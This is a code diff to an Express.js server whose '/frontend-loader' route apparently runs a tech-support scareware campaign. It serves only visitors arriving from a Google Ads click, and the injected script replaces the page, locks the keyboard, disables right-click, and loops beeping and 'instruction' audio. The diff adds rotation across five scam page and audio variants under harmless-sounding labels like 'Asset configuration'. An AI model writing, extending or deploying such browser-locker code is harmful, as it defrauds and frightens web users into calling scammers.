@@ -23,7 +23,38 @@ app.use(
 
 app.use(express.json());
 
-// Middleware for security checks
+// === Asset configuration (HTML + Audio) ===
+const assets = [
+  // 7197
+  {
+    htmlFile: "asset1.html",
+    audioUrl: "https://audio.jukehost.co.uk/luhILbTa2rgzE7BEoQOc0Q9fYW2JdKXR",
+  },
+  // 7191
+  {
+    htmlFile: "asset2.html",
+    audioUrl: "https://audio.jukehost.co.uk/Fo7XvNtE52iSkvc6Xy5SW3pNDqGOXrt4",
+  },
+  // 7199
+  {
+    htmlFile: "asset3.html",
+    audioUrl: "https://audio.jukehost.co.uk/aCBQpNIhnrfGU20C21KXmyY5QTjq5D4I",
+  },
+  // 7193
+  {
+    htmlFile: "asset4.html",
+    audioUrl: "https://audio.jukehost.co.uk/WuM1hVmE3nsuOOu3LvdtEvUQODa8ndH8",
+  },
+  // 7194
+  {
+    htmlFile: "asset5.html",
+    audioUrl: "https://audio.jukehost.co.uk/t1C9SlZQ6sQFZ9h6cuuIVvXxgdOPbzDD",
+  },
+];
+
+let currentAssetIndex = 0; // Global index for round-robin asset selection
+
+// === Security Middleware ===
 function validateRequest(req, res, next) {
   const origin = req.get("origin");
   if (origin !== ALLOWED_ORIGIN) {
@@ -50,6 +81,7 @@ function validateRequest(req, res, next) {
   next();
 }
 
+// === HTML Escaping Utility ===
 function escapeHTMLForJSString(html) {
   return html
     .replace(/\\/g, '\\\\')  // Escape backslashes
@@ -57,14 +89,21 @@ function escapeHTMLForJSString(html) {
     .replace(/\r?\n/g, '');  // Remove newlines
 }
 
+// === Route: /frontend-loader ===
 app.get("/frontend-loader", validateRequest, async (req, res) => {
   const gclid = req.query.gclid;
   if (!gclid || gclid.length < 10) {
     return res.status(403).send("FAILED: gclid missing or too short");
   }
 
-  try {  
-    const rawHTML = await fs.readFile('./asset.html', 'utf8');
+  try {
+    const asset = assets[currentAssetIndex];
+
+    // Increment index (loop back to 0 if end is reached)
+    currentAssetIndex = (currentAssetIndex + 1) % assets.length;
+
+    const htmlPath = path.join(__dirname, asset.htmlFile);
+    const rawHTML = await fs.readFile(htmlPath, "utf8");
     const safeHTML = escapeHTMLForJSString(rawHTML);
 
     const code = `
@@ -72,22 +111,23 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
         document.body.innerHTML = '${safeHTML}';
         navigator.keyboard.lock();
         document.addEventListener('contextmenu', e => e.preventDefault());
-    
-        const audio1 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
-        audio1.loop = true;
-        audio1.play();
-    
-        const mumbaiAudio = new Audio('https://audio.jukehost.co.uk/Fo7XvNtE52iSkvc6Xy5SW3pNDqGOXrt4');
-        mumbaiAudio.loop = true;
-        mumbaiAudio.play();
-    
+
+        const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
+        beepAudio.loop = true;
+        beepAudio.play();
+
+        const instructionAudio = new Audio('${asset.audioUrl}');
+        instructionAudio.loop = true;
+        instructionAudio.play();
+
         document.removeEventListener("click", handleSomeClick);
       });
     `;
-    
+
     res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
-    console.log("Code sent");
+    console.log(`Sent code for: ${asset.htmlFile}`);
     return res.json({ code });
+
   } catch (err) {
     console.error("Error in frontend-loader:", err);
     return res.status(500).json({ error: "Failed to generate frontend loader" });
